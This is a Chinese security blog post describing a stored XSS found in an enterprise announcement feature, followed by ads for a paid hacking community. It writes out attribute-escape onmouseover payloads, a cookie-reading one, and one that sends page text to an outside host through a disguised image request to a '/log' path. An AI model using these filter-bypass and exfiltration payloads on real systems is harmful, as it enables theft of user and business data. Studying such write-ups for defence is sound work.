> **原文链接**: https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247492096&idx=1&sn=5f497b3d236bb09431d51419bebc6eb2

#  【渗透测试】记录某企业存储型XSS漏洞从发现到数据外泄全路径分析  
tangkaixing  神农Sec   2025-06-25 01:01  
  
扫码加圈子  
  
获内部资料  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXLicr9MthUBGib1nvDibDT4r6iaK4cQvn56iako5nUwJ9MGiaXFdhNMurGdFLqbD9Rs3QxGrHTAsWKmc1w/640?wx_fmt=jpeg&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fchVnBLMw4kTQ7B9oUy0RGfiacu34QEZgDpfia0sVmWrHcDZCV1Na5wDQ/640?wx_fmt=png&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
  
#   
  
网络安全领域各种资源，EDUSRC证书站挖掘、红蓝攻防、渗透测试等优质文章，以及工具分享、前沿信息分享、POC、EXP分享。  
不定期分享各种好玩的项目及好用的工具，欢迎关注。加内部圈子，文末有彩蛋（知识星球优惠卷）。  
#   
  
文章作者：  
tangkaixing  
  
文章来源：https://xz.aliyun.com/news/18290  
  
  
**某企业存储型XSS漏洞从发现到数据外泄全路径分析**  
  
  
# 0x1. 概述  
  
  
由于漏洞系统比较敏感，下面涉及域名地址的相关图片我就只能厚码打上，感谢各位看官的支持与理解!!!  
  
# 0x2. 正文  
  
#### 0x01 漏洞发现：  
#### 进入系统后就发现有发布公告的功能点，当然会测试一番，好家伙，被过滤了，在换，再试，然后看js，确实过滤，就不断尝试，burp改包发包验证，常规xss语句看来是弹窗不了；不要问我为什么就觉得这里有问题，问就是凭借直觉和它做了过滤动作，必定有没有过滤到位的，自然也就坚持去搞搞。  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUxMYhvbNTx2MbdTb6DpIaX0GKM5cTsCCufVadyrq0bE169dnpG9ladFWLIYIqmoKrcB4dpZ1GtFw/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUxMYhvbNTx2MbdTb6DpIaXzLAE0iaS7LZarZW4LaiatJibZq08bm64nmMeWkrDglKQwTlJdibqzIq9rw/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUxMYhvbNTx2MbdTb6DpIaX3BZo94re3zmBzYuAjOhRQmcU2HJAmQlCQ2ghpXUzyHibfJ48gGbIBFg/640?wx_fmt=png&from=appmsg "")  
  
  
然后就看了，发布公告的里面输入框具体过滤什么，分析后就开始绕过之路！！！  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUxMYhvbNTx2MbdTb6DpIaXGn3YvLlkLTic7zSN3qz37dvw8sQftZKwYVeXeDotMF971axRn4YYWkg/640?wx_fmt=png&from=appmsg "")  
  
  
从js可以知道  
存在前端过滤+符号转义+禁用字符检测，同时也分析发现前端过滤机制excludeSpecial()函数被注释无效，containSpecial()仅检测$^<>和script关键词，就是使用绕过特殊字符检测，采用无尖括号事件处理器：onmouseover代替onload。  
  
  
  
#### 0x02 验证漏洞：  
  
  
分析后就如下方式尝试构造如下3个poc进行绕过：  
  
1. **语法构造优化**  
- " x="  
：强制闭合原始属性  
  
- 空格分隔：绕过空格过滤检测  
- 省略引号：采用无引号事件调用  
1. **特征规避技术**  
- 避免使用黑名单字符：  
<>$^  
等  
  
- 避开关键词：不使用  
script/js/http  
等  
  
- 使用低频事件处理器：onmouseover> onclick  
<table><tbody><tr style="height: 33px;"><td data-colwidth="250" width="250" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><strong><span style="color: rgb(0, 0, 0);font-size: 14px;"><span leaf="">POC</span></span></strong></p></td><td data-colwidth="250" width="250" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><strong><span style="color: rgb(0, 0, 0);font-size: 14px;"><span leaf="">验证阶段</span></span></strong></p></td><td data-colwidth="250" width="250" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><strong><span style="color: rgb(0, 0, 0);font-size: 14px;"><span leaf="">渗透对象</span></span></strong></p></td></tr><tr style="height: 33px;"><td data-colwidth="250" width="250" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span style="color: rgb(0, 0, 0);font-size: 14px;"><span leaf="">&#34; onmouseover=&#34;alert(1)&#34; x=&#34;</span></span></p></td><td data-colwidth="250" width="250" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span style="color: rgb(0, 0, 0);font-size: 14px;"><span leaf="">基础验证弹窗</span></span></p></td><td data-colwidth="250" width="250" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span style="color: rgb(0, 0, 0);font-size: 14px;"><span leaf="">事件触发机制</span></span></p></td></tr><tr style="height: 33px;"><td data-colwidth="250" width="250" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span style="color: rgb(0, 0, 0);font-size: 14px;"><span leaf="">&#34; onmouseover=&#34;alert(document.cookie)&#34; x=&#34;</span></span></p></td><td data-colwidth="250" width="250" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span style="color: rgb(0, 0, 0);font-size: 14px;"><span leaf="">会话穿透</span></span></p></td><td data-colwidth="250" width="250" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span style="color: rgb(0, 0, 0);font-size: 14px;"><span leaf="">HttpOnly Cookie保护</span></span></p></td></tr><tr style="height: 33px;"><td data-colwidth="250" width="250" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span style="color: rgb(0, 0, 0);font-size: 14px;"><span leaf="">&#34; onmouseover=&#34;(new Image).src=&#39;...&#39;&#34; x=&#34;</span></span></p></td><td data-colwidth="250" width="250" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span style="color: rgb(0, 0, 0);font-size: 14px;"><span leaf="">数据渗出</span></span></p></td><td data-colwidth="250" width="250" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span style="color: rgb(0, 0, 0);font-size: 14px;"><span leaf="">DOM核心业务节点</span></span></p></td></tr></tbody></table>  

```
&#34; onmouseover=&#34;alert(1)&#34; x=&#34;

1. 关键字符检测仅限 [$^<>]，空格/引号/括号均被放行
2. &#34;script&#34;检测可通过事件处理器绕过
3. 未监控Image对象请求外部资源行为  
```

  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUxMYhvbNTx2MbdTb6DpIaXKEAn03yDlS6OzNoxSlH2rc9jqM4lFdUc2QI2tQhgj73tKoya2Mhbfw/640?wx_fmt=png&from=appmsg "")  
  
  
DOM精准渗透/流量伪装技术：  
  

```
&#34; onmouseover=&#34;alert(document.cookie)&#34; x=&#34;    

&#34; onmouseover=&#34;
  (new Image).src='https://x.xxx.xx.xx:8000/log?k='+encodeURIComponent(
    document.querySelector('.th_bg').innerText
  )
&#34; x=&#34; 

.th_bg             // 定位企业公告核心DOM节点
.innerText         // 文本提取避开HTML结构干扰
encodeURIComponent // 规避特殊字符警报
(new Image).src=   // 伪装图片请求
'http://'+IP+端口   // 绕过协议关键字检测
/log?k=            // 模拟正常日志请求

```

  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUxMYhvbNTx2MbdTb6DpIaXJw6vxNrRicwM2dcgJpUInj0sicGbicK9sdia8cTUA9qRUojniazfEJHTj4w/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUxMYhvbNTx2MbdTb6DpIaXZcMQxRC7sbicUAiaebTKF4yAnASOiaZhfwqA8KOgfZZB2AagbQZBO3b0Q/640?wx_fmt=png&from=appmsg "")  
  
  
**漏洞核心突破点**  
：  
  
  
- 无视  
containSpecial()  
函数对  
$^<>  
和  
script  
的检测  
  
- 利用前端过滤失效实现HTML属性逃逸  
- 实现从基础弹窗到业务数据窃取的攻击  
- 输入检测盲区 + 渲染层无过滤 = 持久化攻击链  
# 0x3. 总结  
  
  
**根本漏洞链**  
：  
  
     无效过滤函数 → 事件处理器白名单缺失 → 属性逃逸构造 → DOM数据渗出  
  
  
**完整漏洞链**  
：  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUxMYhvbNTx2MbdTb6DpIaXRWp8DYa3NIrdm2eB55xhv5qYhPNosia3XObbv20JicCybEsSZn6JwIibw/640?wx_fmt=png&from=appmsg "")  
  
  
**渗透测试链路**  
：  
  

```
过滤检测 → 属性逃逸 → 事件注入 → 数据提取 → 外传通道

//坚持自己选择，不要遇到绕不过的就放弃了，毕竟有很多事情，不起尝试怎么知道自己不行咯！
```

#   
# 0x4. 最后忠告  
  
  
XSS漏洞挖掘的本质是语法与规则的对抗。成功的挖掘必须建立在：  
  
  
1. 对过滤机制的逆向解构  
1. 业务场景数据节点的测绘  
1. 渗出通道的隐蔽性保障 保持对空格/引号/括号等基础语法元素的敏感性，往往比追求复杂攻击技术更有成效！  
**内部小圈子详情介绍**  
  
  
  
我们是  
神农安全  
，点赞 + 在看  
 铁铁们点起来，最后祝大家都能心想事成、发大财、行大运。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mngWTkJEOYJDOsevNTXW8ERI6DU2dZSH3Wd1AqGpw29ibCuYsmdMhUraS4MsYwyjuoB8eIFIicvoVuazwCV79t8A/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/MVPvEL7Qg0F0PmZricIVE4aZnhtO9Ap086iau0Y0jfCXicYKq3CCX9qSib3Xlb2CWzYLOn4icaWruKmYMvqSgk1I0Aw/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
**内部圈子介绍**  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/MVPvEL7Qg0F0PmZricIVE4aZnhtO9Ap08Z60FsVfKEBeQVmcSg1YS1uop1o9V1uibicy1tXCD6tMvzTjeGt34qr3g/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
**圈子专注于更新src/红蓝攻防相关：**  
  

```
1、维护更新src专项漏洞知识库，包含原理、挖掘技巧、实战案例
2、知识星球专属微信“小圈子交流群”
3、微信小群一起挖洞
4、内部团队专属EDUSRC证书站漏洞报告
5、分享src优质视频课程（企业src/EDUSRC/红蓝队攻防）
6、分享src挖掘技巧tips
7、不定期有众测、渗透测试项目（一起挣钱）
8、不定期有工作招聘内推（工作/护网内推）
9、送全国职业技能大赛环境+WP解析（比赛拿奖）
```

  
  
  
  
**内部圈子**  
**专栏介绍**  
  
知识星球内部共享资料截屏详情如下  
  
（只要没有特殊情况，每天都保持更新）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYcoLuuFqXztiaw8CzfxpMibRSekfPpgmzg6Pn4yH440wEZhQZaJaxJds7olZp5H8Ma4PicQFclzGbQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYcoLuuFqXztiaw8CzfxpMibgpeLSDuggy2U7TJWF3h7Af8JibBG0jA5fIyaYNUa2ODeG1r5DoOibAXA/640?wx_fmt=png&from=appmsg "")  
  
  
**知识星球——**  
**神农安全**  
  
星球现价   
￥45元  
  
如果你觉得应该加入，就不要犹豫，价格只会上涨，不会下跌  
  
星球人数少于900人 45元/年  
  
星球人数少于1000人 60元/年  
  
（新人优惠卷20，扫码或者私信我即可领取）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUULMWYYicxI1oIZZu1chARoMttntYglBBjtL5tbEeyjQxaibiablKM26xoGibI1Rc1QgOrQbDvia1suXA/640?wx_fmt=png&from=appmsg "")  
  
欢迎加入星球一起交流，券后价仅45元！！！ 即将满900人涨价  
  
长期  
更新，更多的0day/1day漏洞POC/EXP  
  
  
  
**内部知识库--**  
**（持续更新中）**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUw2r3biacicUOicXUZHWj2FgFu12KTxgSfI69k7BChztff43VObUMsvvLyqsCRYoQnRKg1ibD7A0U3bQ/640?wx_fmt=png&from=appmsg "")  
  
  
**知识库部分大纲目录如下：**  
  
知识库跟  
知识星球联动，基本上每天保持  
更新，满足圈友的需求  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUw2r3biacicUOicXUZHWj2FgFhXF33IuCNWh4QOXjMyjshticibyeTV3ZmhJeGias5J14egV36UGXvwGSA/640?wx_fmt=png&from=appmsg "")  
  
  
知识库和知识星球有师傅们关注的  
EDUSRC  
和  
CNVD相关内容（内部资料）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUw2r3biacicUOicXUZHWj2FgFKDNucibvibBty5UMNwpjeq1ToHpicPxpNwvRNj3JzWlz4QT1kbFqEdnaA/640?wx_fmt=png&from=appmsg "")  
  
  
还有网上流出来的各种  
SRC/CTF等课程视频  
  
量大管饱，扫描下面的知识星球二维码加入即可  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUw2r3biacicUOicXUZHWj2FgFxYMxoc1ViciafayxiaK0Z26g1kfbVDybCO8R88lqYQvOiaFgQ8fjOJEjxA/640?wx_fmt=png&from=appmsg "")  
  
  
  
不会挖CNVD？不会挖EDURC？不会挖企业SRC？不会打nday和通杀漏洞？  
  
直接加入我们小圈子：  
知识星球+内部圈子交流群+知识库  
  
快来吧！！  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUMULI8zm64NrH1pNBpf6yJ5wUOL9GnsxoXibKezHTjL6Yvuw6y8nm5ibyL388DdDFvuAtGypahRevg/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWUMULI8zm64NrH1pNBpf6yJO0FHgdr6ach2iaibDRwicrB3Ct1WWhg9PA0fPw2J1icGjQgKENYDozpVJg/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1 "")  
  
  
神农安全知识库内部配置很多  
内部工具和资料💾，  
玄机靶场邀请码+EDUSRC邀请码等等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXjm2h60OalGLbwrsEO8gJDNtEt0PfMwXQRzn9EDBdibLWNDZXVVjog7wDlAUK1h3Y7OicPQCYaw2eA/640?wx_fmt=png&from=appmsg "")  
  
  
快要护网来临，是不是需要  
护网面试题汇总  
？  
问题+答案（超级详细🔎）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXjm2h60OalGLbwrsEO8gJDbLia1oCDxSyuY4j0ooxgqOibabZUDCibIzicM6SL2CMuAAa1Qe4UIRdq1g/640?wx_fmt=png&from=appmsg "")  
  
  
最后，师傅们也是希望找个  
好工作，那么常见的  
渗透测试/安服工程师/驻场面试题目，你值得拥有！！！  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXjm2h60OalGLbwrsEO8gJDicYew8gfSB3nicq9RFgJIKFG1UWyC6ibgpialR2UZlicW3mOBqVib7SLyDtQ/640?wx_fmt=png&from=appmsg "")  
  
  
内部小圈子——  
圈友反馈  
（  
良心价格  
）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWW0s5638ehXF2YQEqibt8Hviaqs0Uv6F4NTNkTKDictgOV445RLkia2rFg6s6eYTSaDunVaRF41qBibY1A/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWW0s5638ehXF2YQEqibt8HviaRhLXFayW3gyfu2eQDCicyctmplJfuMicVibquicNB3Bjdt0Ukhp8ib1G5aQ/640?wx_fmt=png&from=appmsg "")  
  
  
****  
**神农安全公开交流群**  
  
有需要的师傅们直接扫描文章二维码加入，然后要是后面群聊二维码扫描加入不了的师傅们，直接扫描文章开头的二维码加我（备注加群）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWUxMYhvbNTx2MbdTb6DpIaX7AicI3tqibhLhQcrwZ2PH9XygJXxdlKwt3lqOqYlCJUE8IBHw43Ox2zQ/640?wx_fmt=jpeg&from=appmsg "")  
  
    

```
申明：本公众号所分享内容仅用于网络安全技术讨论，切勿用于违法途径，所有渗透都需获取授权，违者后果自行承担，与本号及作者无关，请谨记守法.

```

  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/b7iaH1LtiaKWW8vxK39q53Q3oictKW3VAXz4Qht144X0wjJcOMqPwhnh3ptlbTtxDvNMF8NJA6XbDcljZBsibalsVQ/640?wx_fmt=gif "")  
  
  
  
